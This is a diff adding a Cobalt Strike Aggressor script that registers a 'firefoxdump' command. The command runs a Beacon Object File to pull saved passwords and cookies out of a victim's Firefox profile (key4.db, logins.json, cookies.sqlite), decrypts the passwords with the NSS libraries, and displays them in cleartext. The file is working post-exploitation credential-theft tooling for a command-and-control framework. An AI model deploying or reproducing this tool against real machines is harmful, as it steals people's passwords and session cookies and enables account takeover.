@@ -1,0 +1,52 @@
+# Firefox Dump BOF - Extract Firefox passwords and cookies
+# Standalone version for Cobalt Strike
+
+beacon_command_register(
+    "firefoxdump",
+    "Extract Firefox secrets (cookies, passwords) from Firefox profile.",
+    "INFO:\n" .
+    "Extracts browser secrets from Firefox browser.\n" .
+    "This BOF reads Firefox profile files (key4.db, logins.json, cookies.sqlite).\n\n" .
+    "SUPPORTED DATA:\n" .
+    "  - Saved passwords (from logins.json - decrypted using NSS)\n" .
+    "  - Cookies (from cookies.sqlite)\n\n" .
+    "USAGE:\n" .
+    "  firefoxdump          - Extract passwords only (default)\n" .
+    "  firefoxdump /all     - Extract passwords and cookies\n" .
+    "  firefoxdump /cookies - Extract cookies only\n\n" .
+    "OUTPUT:\n" .
+    "Displays extracted passwords (cleartext) and/or cookies.\n" .
+    "Passwords are decrypted using NSS libraries from Firefox installation.\n\n" .
+    "NOTE:\n" .
+    "Requires access to the user's Firefox profile directory.\n" .
+    "Works best when run from the same user context as Firefox.\n" .
+    "Requires Firefox to be installed (for NSS libraries).\n"
+);
+
+alias firefoxdump {
+    local('$bid $barch $handle $bof $option $data');
+    $bid = $1;
+    $barch = barch($bid);
+
+    # Extract option from command line
+    if (size(@_) > 1) {
+        $option = @_[1];
+    } else {
+        $option = "";
+    }
+
+    # Read the BOF file
+    $handle = openf(script_resource("bin/firefoxdump." . $barch . ".o"));
+    $bof = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($bof) == 0) {
+        berror($bid, "Could not read firefoxdump BOF file");
+        return;
+    }
+
+    # Pack option for BOF
+    $data = bof_pack($bid, "z", $option);
+    btask($bid, "Extracting Firefox secrets");
+    beacon_inline_execute($bid, $bof, "go", $data);
+}
